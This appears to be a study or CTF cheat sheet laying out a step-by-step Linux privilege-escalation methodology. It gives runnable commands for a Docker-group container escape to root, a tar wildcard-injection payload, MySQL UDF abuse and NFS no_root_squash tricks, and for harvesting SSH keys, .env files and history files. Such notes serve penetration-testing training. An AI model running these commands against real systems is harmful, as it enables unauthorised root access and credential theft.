# 04 — Privilege Escalation: Methodology

> Systematic step-by-step approach for escalating privileges on Linux systems.

---

## 🔴 PrivEsc Methodology Flowchart

```
START (Low-privilege shell)
  │
  ├─→ Step 1: Situational Awareness
  │     ├── whoami / id / hostname
  │     ├── uname -a / cat /etc/os-release
  │     └── Network position (ip a, ss -tulpn)
  │
  ├─→ Step 2: Quick Wins (try first)
  │     ├── sudo -l → GTFOBins lookup
  │     ├── SUID binaries → GTFOBins lookup
  │     ├── Writable /etc/passwd → Add root user
  │     └── Docker group → Container escape to root
  │
  ├─→ Step 3: Credential Hunting
  │     ├── History files (~/.bash_history)
  │     ├── Config files (/var/www/.env, *.conf)
  │     ├── Database credentials
  │     ├── SSH keys (/home/*/.ssh/)
  │     └── Password reuse (try found creds for root)
  │
  ├─→ Step 4: Scheduled Tasks & Processes
  │     ├── Cron jobs (crontab -l, /etc/crontab)
  │     ├── pspy (hidden cron jobs)
  │     ├── Writable scripts called by root
  │     └── PATH hijacking opportunities
  │
  ├─→ Step 5: Service Exploitation
  │     ├── MySQL running as root (UDF exploit)
  │     ├── NFS misconfig (no_root_squash)
  │     ├── Internal services on localhost
  │     └── Wildcard injection (tar, rsync)
  │
  ├─→ Step 6: Kernel Exploits (last resort)
  │     ├── linux-exploit-suggester
  │     ├── PwnKit, DirtyCow, DirtyPipe
  │     └── Compile on attacker, transfer, execute
  │
  └─→ ROOT OBTAINED
        ├── cat /root/flag.txt (CTF)
        ├── Document the escalation chain
        └── Establish persistence (post-exploitation)
```

---

## 🔴 Detailed Steps

### Step 1: Situational Awareness

```bash
# Who are we?
whoami && id

# What system is this?
hostname && uname -a && cat /etc/os-release

# What's our network position?
ip a && ip route

# What's listening?
ss -tulpn

# Who else is logged in?
w && last

# What's the date/time? (important for cron analysis)
date
```

### Step 2: Quick Wins

```bash
# Sudo — THE FASTEST PATH
sudo -l
# If (ALL) NOPASSWD: /something → Check GTFOBins immediately

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Cross-reference each with https://gtfobins.github.io/

# Writable /etc/passwd
ls -la /etc/passwd
# If writable: game over in 10 seconds

# Docker group
id | grep docker
# If in docker group: docker run -v /:/host -it ubuntu chroot /host bash
```

### Step 3: Credential Hunting

```bash
# History files
cat ~/.bash_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null
cat ~/.python_history 2>/dev/null

# Environment variables
env | grep -iE "pass|key|secret|token|cred"

# Config files with passwords
grep -rn "password\|passwd\|pass\|pwd" /var/www/ /opt/ /etc/ /home/ 2>/dev/null | grep -v "Binary"
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null

# Database credentials
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null
cat /var/www/html/config.php 2>/dev/null

# Try password reuse
su root  # Try every password you've found
```

### Step 4: Scheduled Tasks & Process Analysis

```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/

# User cron
crontab -l
for user in $(cut -d: -f1 /etc/passwd); do
  echo "=== $user ==="
  crontab -u $user -l 2>/dev/null
done

# Check if cron scripts are writable
find /etc/cron* -writable -type f 2>/dev/null

# Monitor processes for hidden cron jobs
./pspy64  # Let it run for 5 minutes and watch for patterns

# Look for wildcard injection
cat /etc/crontab | grep -E "tar|rsync|chown|chmod"
# tar with wildcard (*) in cron:
# cd /target/dir && echo "" > "--checkpoint=1" && echo "" > "--checkpoint-action=exec=sh shell.sh"
```

### Step 5: Service-Based Escalation

```bash
# MySQL running as root
mysql -u root
mysql -u root -p'password'  # Try common passwords
# If in: SELECT sys_exec('id');  or UDF exploit

# NFS shares
showmount -e localhost
cat /etc/exports  # Look for no_root_squash
# If found: mount the share, create SUID binary as root

# Internal web services
curl http://127.0.0.1:8080
curl http://127.0.0.1:3000
# Might find admin panels with default creds
```

---

## 📋 Priority Order

| Priority | Check | Time | Success Rate |
|----------|-------|------|-------------|
| 1 | `sudo -l` | 5 sec | Very High |
| 2 | SUID binaries | 10 sec | High |
| 3 | Writable /etc/passwd | 5 sec | If writable: 100% |
| 4 | Credential files | 2 min | High |
| 5 | Cron jobs | 2 min | Medium |
| 6 | Docker group | 5 sec | If member: 100% |
| 7 | Capabilities | 10 sec | Medium |
| 8 | PATH hijacking | 5 min | Medium |
| 9 | Kernel exploits | 10 min | Varies |
